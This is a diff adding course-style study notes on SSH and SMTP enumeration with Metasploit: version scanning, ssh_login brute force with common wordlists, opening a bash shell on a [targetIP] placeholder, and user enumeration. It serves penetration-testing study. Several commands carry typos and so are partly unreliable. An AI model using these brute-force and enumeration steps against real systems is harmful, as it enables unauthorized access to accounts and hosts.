@@ -599,6 +599,107 @@ Now we have access to the mysql database server.
 
 `show tables;`
 
+## SSH Enumeration
+
+- SSH is a remote administration protocol that offers encryption and is the successor to Telnet.
+- It is typically used for remote access to servers and systems.
+- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
+- We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target.
+
+## Demo: SSH Enumeration
+
+`serivce postgresql start && msfconsole`
+
+msf6:`workspace -a SSH_ENUM`
+
+msf6:`setg rhosts [targetIP]`
+
+msf6:`search type:auxiliary name:ssh`
+
+msf6:`use auxiliary/scanner/ssh/ssh_version`
+
+msf6:`run`
+
+We enumerated the version and OS etc.
+
+msf6:`search type:auxiliary name:ssh`
+
+If the target has password authentication, we use the ssh_login module. If it has public/key authentication, we use the login_pubkey module.
+
+msf6:`use auxiliary/scanner/ssh/ssh_login`
+
+msf6:`set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt`
+
+msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
+
+msf6:`run`
+
+We've got some credentials.
+
+The module created a session for us :
+
+msf6:`sessions`
+
+msf6:`sessions 1`
+
+`/bin/bash -i`
+
+bash:`ls`
+
+bash:`whoami`
+
+bash:`e`
+
+bash: `exit`
+
+msf6:`sessions`: No active sessions anymore
+
+msf6:`search type:auxiliary name:ssh`
+
+msf6:`auxiliary/scanner/ssh/ssh_enumusers`
+
+msf6:`show options`
+
+msf6:`set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt`
+
+## SMTP Enumeration
+
+- SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
+- SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
+- We can utilize auxiliary modules to enumerate the version of SMTP as well as user accounts on the target system.
+
+## Demo: SMTP Enumeration
+
+`ifonfig`
+
+`nmap -Pn [targetIP]`: We want to detect on which port smtp is running on
+
+`service postgresql && msfconsole`
+
+msf6:`workspace -a SMTP_Enum`
+
+msf6:`setg rhosts [target IP]`
+
+msf6:`search type:auxiliary name:smtp`
+
+msf6:`suse auxiliary/scanner/smtp/smtp_version`
+
+msf6:`show options`
+
+msf6:`run`
+
+We get he version, domain etc
+
+msf6:`search type:auxiiary name:smtp`
+
+msf6:`use auxiliary/scanner/smtp/smtp_enum`
+
+msf6:`run`
+
+Now we could perform a brute-force on the users and gain access to SMTP.
+
+
+
 
 
 
